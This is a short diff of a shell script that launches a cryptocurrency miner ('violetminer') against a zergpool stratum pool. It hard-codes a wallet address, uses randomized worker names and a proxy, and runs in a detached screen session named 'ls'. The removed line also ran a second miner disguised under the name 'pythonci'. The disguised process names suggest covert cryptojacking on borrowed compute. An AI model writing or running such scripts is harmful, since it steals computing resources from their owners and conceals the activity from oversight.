@@ -8,4 +8,4 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
-./violetminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY  & sleep 2 && ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 
+./violetminer -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 
